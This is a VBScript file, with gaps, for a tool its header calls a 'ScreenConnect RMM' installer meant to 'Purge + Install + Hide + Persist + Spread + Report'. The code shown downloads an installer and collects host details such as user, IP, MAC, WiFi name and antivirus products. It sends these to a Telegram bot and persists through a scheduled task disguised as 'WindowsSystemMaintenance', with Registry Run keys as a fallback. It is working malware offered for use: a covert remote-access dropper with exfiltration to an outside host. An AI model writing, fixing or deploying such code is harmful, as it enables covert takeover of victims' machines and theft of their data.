'==========================================================================
' SCRIPT:    ScreenConnect RMM - ULTIMATE v5.1
'            Full Purge + Install + Hide + Persist + Spread + Report
' AUTHOR:    Custom Build
' DATE:      2026-07-16
' CHANGELOG: v5.1 - Fixed Telegram reporting, task scheduling, URL encoding,
'                   WMI compatibility, 64-bit registry, HTTP timeouts
'==========================================================================
Option Explicit
...
Sub Main()
    LogMessage "============================================================"
    LogMessage " ScreenConnect ULTIMATE Installer & Hider v5.1"
...
Function DownloadMSI(sUrl, sDestPath)
    ...
    ' Try WinHttp first (supports SetTimeouts)
    ...
    ' SetTimeouts only works with WinHttp
    If sHTTPType = "WinHttp" Then
        oHTTP.SetTimeouts 600000, 600000, 600000, 600000
    Else
        ' For ServerXMLHTTP/XMLHTTP, use separate timeout properties
        On Error Resume Next
        oHTTP.setOption 2, 600000  ' SXH_OPTION_URL_TIMEOUT
        oHTTP.setOption 3, 600000  ' SXH_OPTION_RECEIVE_TIMEOUT
        Err.Clear
    End If
...
Sub GatherSystemInventory()
    ...
    ' Computer Name & User
    sInfo = sInfo & "🖥️ Computer: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbLf
    sInfo = sInfo & "👤 Username: " & oShell.ExpandEnvironmentStrings("%USERNAME%") & vbLf
    
    ' OS Info
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        sInfo = sInfo & "🪟 Windows: " & objOS.Caption & vbLf
        sInfo = sInfo & "📐 Architecture: " & objOS.OSArchitecture & vbLf
        sInfo = sInfo & "📅 OS Installed: " & Left(objOS.InstallDate, 10) & vbLf
        ...
        sInfo = sInfo & "⏱️ Uptime: " & nUptime & " hours" & vbLf
    Next
    ...
    For Each objCPU In colCPU
        sInfo = sInfo & "🧠 CPU: " & Trim(objCPU.Name) & vbLf
        sInfo = sInfo & "🔢 Cores: " & objCPU.NumberOfCores & vbLf
        Exit For
    Next
    ...
    For Each objRAM In colRAM
        ...
        sInfo = sInfo & "🧮 RAM: " & nTotalRAM & " GB" & vbLf
        Exit For
    Next
    ...
    If oDrive.IsReady Then
        sInfo = sInfo & "💾 Disk C: " & FormatFileSize(oDrive.TotalSize) & _
                " (" & FormatFileSize(oDrive.FreeSpace) & " free)" & vbLf
    End If
    Set oDrive = Nothing
    ...
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then
            sInfo = sInfo & "🌐 IP: " & objNet.IPAddress(0) & vbLf
        End If
        If Not IsNull(objNet.MACAddress) Then
            sInfo = sInfo & "🔗 MAC: " & objNet.MACAddress & vbLf
        End If
        Exit For
    Next
    ...
    sSSID = GetWiFiSSID()
    If sSSID <> "" Then
        sInfo = sInfo & "📡 WiFi: " & sSSID & vbLf
    End If
    
    ' Antivirus
    Dim sAVList
    sAVList = GetAntivirusInfo()
    If sAVList = "" Then sAVList = "Windows Defender (default)"
    sInfo = sInfo & "🛡️ Antivirus: " & sAVList & vbLf
...
'==========================================================================
' SEND TELEGRAM REPORT (FIXED - v5.1)
'==========================================================================
Sub SendTelegramReport(sStatus, sExtraInfo)
    ...
    ' Build message using actual newlines (vbLf)
    Dim sMessage
    sMessage = "📋 SC INSTALLER REPORT" & vbLf & vbLf
    sMessage = sMessage & "📌 STATUS: " & sStatus & vbLf
    sMessage = sMessage & "🕐 Time: " & FormatDateTime(Now, 0) & vbLf & vbLf
    
    If g_SystemInfo <> "" Then
        sMessage = sMessage & "--- SYSTEM INFO ---" & vbLf
        sMessage = sMessage & g_SystemInfo & vbLf
    End If
    
    sMessage = sMessage & "--- INSTALL RESULTS ---" & vbLf
    sMessage = sMessage & "🗑️ Removed: " & g_RemovedTools & vbLf
    
    If g_NetworkPCs <> "" Then
        sMessage = sMessage & "🔗 Network PCs: " & g_NetworkPCs & vbLf
    End If
    
    If sExtraInfo <> "" Then
        sMessage = sMessage & vbLf & "⚠️ " & sExtraInfo & vbLf
    End If
    
    LogMessage "[TELEGRAM] Sending report..."
    LogMessage "[TELEGRAM] Message length: " & Len(sMessage) & " chars"
    
    ' PROPER URL ENCODING
    Dim sEncodedMessage
    sEncodedMessage = URLEncode(sMessage)
    
    ' Build URL
    Dim sURL
    sURL = "https://api.telegram.org/bot" & sBotToken & "/sendMessage"
    
    ' Use POST method for reliability with long messages
    Dim sPostData
    sPostData = "chat_id=" & sChatID & "&text=" & sEncodedMessage & "&parse_mode=HTML"
    ...
    If Err.Number <> 0 Then
        LogMessage "[TELEGRAM] Failed to create HTTP object."
        Exit Sub
    End If
    
    ' Set timeouts (only for WinHttp)
    On Error Resume Next
    ...
    If Err.Number <> 0 Then
        LogMessage "[TELEGRAM] Send error: " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
    ...
    ' Check response
    If oHTTP.Status = 200 Then
        ' Parse JSON response to check for Telegram errors
        Dim sResponse
        sResponse = oHTTP.responseText
        
        If InStr(1, sResponse, """ok"":true", vbTextCompare) > 0 Then
            LogMessage "[TELEGRAM] Report sent successfully!"
        ElseIf InStr(1, sResponse, """ok"":false", vbTextCompare) > 0 Then
            LogMessage "[TELEGRAM] Telegram API error: " & sResponse
            
            ' Try without parse_mode if HTML parsing fails
            If InStr(1, sResponse, "can't parse entities", vbTextCompare) > 0 Then
                LogMessage "[TELEGRAM] Retrying without parse_mode..."
                
                sPostData = "chat_id=" & sChatID & "&text=" & URLEncode(sMessage)
                oHTTP.Open "POST", sURL, False
                oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
                oHTTP.Send sPostData
                ...
                If oHTTP.Status = 200 Then
                    sResponse = oHTTP.responseText
                    If InStr(1, sResponse, """ok"":true", vbTextCompare) > 0 Then
                        LogMessage "[TELEGRAM] Report sent successfully (plain text mode)!"
                    Else
                        LogMessage "[TELEGRAM] Still failed: " & sResponse
                    End If
                End If
            End If
        Else
            LogMessage "[TELEGRAM] Unexpected response: " & sResponse
        End If
    Else
        LogMessage "[TELEGRAM] HTTP Error. Status: " & oHTTP.Status
        LogMessage "[TELEGRAM] Response: " & oHTTP.responseText
    End If
...
Function URLEncode(sText)
    ' Proper RFC 3986 URL encoding
    Dim sResult, i, sChar, nAsc
    ...
    For i = 1 To Len(sText)
        ...
        If (nAsc >= 48 And nAsc <= 57) Or _
           (nAsc >= 65 And nAsc <= 90) Or _
           (nAsc >= 97 And nAsc <= 122) Or _
           nAsc = 45 Or nAsc = 95 Or nAsc = 46 Or nAsc = 126 Then
        ...
        ' Everything else → %XX
        Else
            sResult = sResult & "%" & Right("0" & Hex(nAsc), 2)
        End If
    Next
...
'==========================================================================
' GET WIFI SSID (FIXED - v5.1)
'==========================================================================
Function GetWiFiSSID()
    GetWiFiSSID = ""
    On Error Resume Next
    
    ' Method 1: WMI (works on some systems)
    Dim colWiFi, objWiFi
    ...
    For Each objWiFi In colWiFi
        If Not IsNull(objWiFi.Ndis80211SsId) Then
            ...
            For j = 0 To UBound(arrSSID)
                If arrSSID(j) <> 0 Then GetWiFiSSID = GetWiFiSSID & Chr(arrSSID(j))
            Next
            If GetWiFiSSID <> "" Then Exit Function
        End If
    Next
    
    ' Method 2: netsh fallback (works on Win10/11)
    Dim oExec, sOutput, aLines, i, sLine
    Set oExec = oShell.Exec("netsh wlan show interfaces")
    sOutput = oExec.StdOut.ReadAll
    
    If InStr(1, sOutput, "SSID", vbTextCompare) > 0 Then
        aLines = Split(sOutput, vbCrLf)
        For i = 0 To UBound(aLines)
            sLine = Trim(aLines(i))
            If InStr(1, sLine, "SSID", vbTextCompare) = 1 Then
                If InStr(sLine, ":") > 0 Then
                    GetWiFiSSID = Trim(Mid(sLine, InStr(sLine, ":") + 1))
                    If GetWiFiSSID <> "" And GetWiFiSSID <> "BSSID" Then Exit Function
                End If
            End If
        Next
    End If
...
Function GetAntivirusInfo()
    ...
    If Err.Number = 0 Then
        For Each objAV In colAV
            If GetAntivirusInfo <> "" Then GetAntivirusInfo = GetAntivirusInfo & ", "
            GetAntivirusInfo = GetAntivirusInfo & objAV.displayName
        Next
    End If
    Err.Clear
    
    ' Fallback: SecurityCenter (Windows Vista)
    If GetAntivirusInfo = "" Then
        Set colAV = oWMI.ExecQuery("SELECT * FROM AntiVirusProduct", "root\SecurityCenter")
        If Err.Number = 0 Then
            For Each objAV In colAV
                If GetAntivirusInfo <> "" Then GetAntivirusInfo = GetAntivirusInfo & ", "
                GetAntivirusInfo = GetAntivirusInfo & objAV.displayName
...
'==========================================================================
' CREATE PERSISTENCE (FIXED - v5.1)
'==========================================================================
Sub CreatePersistence()
    On Error Resume Next
    
    Dim sTaskName, sXMLPath
    sTaskName = "WindowsSystemMaintenance"
    sXMLPath = sTempDir & "\task_trigger.xml"
    ...
    ' Create base task with DAILY trigger (fixed quote syntax)
    Dim sCreateTaskCmd
    ...
    If Err.Number = 0 Then
        ' Export task to XML
        oShell.Run "schtasks /query /tn """ & sTaskName & """ /xml > """ & sXMLPath & """", 0, True
        WScript.Sleep 2000
        
        ' Add logon trigger to XML
        If oFSO.FileExists(sXMLPath) Then
            AddLogonTriggerToXML sXMLPath
            ' Re-import modified XML
            oShell.Run "schtasks /create /tn """ & sTaskName & """ /xml """ & sXMLPath & """ /f", 0, True
            oFSO.DeleteFile sXMLPath, True
        End If
        
        LogMessage "[PERSISTENCE] Task created with both triggers (Daily + Logon)."
    Else
        ' Fallback: Registry Run key (64-bit aware)
        LogMessage "[PERSISTENCE] Task failed. Using Registry fallback..."
        
        ' Write to native registry
        oShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & sTaskName, _
                        "wscript.exe //B """ & sHiddenScriptPath & """", "REG_SZ"
        
        ' Also write to WOW6432Node for 32-bit compatibility
        oShell.RegWrite "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\" & sTaskName, _
                        "wscript.exe //B """ & sHiddenScriptPath & """", "REG_SZ"
        
        LogMessage "[PERSISTENCE] Registry Run keys added (both 32/64-bit)."
    End If
...
' ADD LOGON TRIGGER TO XML
'==========================================================================
Sub AddLogonTriggerToXML(sXMLPath)
    On Error Resume Next
    Dim oFile, sContent
    Set oFile = oFSO.OpenTextFile(sXMLPath, 1)
    sContent = oFile.ReadAll
    oFile.Close
    
    ' Insert LogonTrigger before </Triggers>
    Dim sLogonTrigger
    sLogonTrigger = "    <LogonTrigger>" & vbCrLf & _
                    "      <Enabled>true</Enabled>" & vbCrLf & _
                    "    </LogonTrigger>" & vbCrLf
    
    sContent = Replace(sContent, "  </Triggers>", sLogonTrigger & "  </Triggers>")
    
    Set oFile = oFSO.OpenTextFile(sXMLPath, 2)
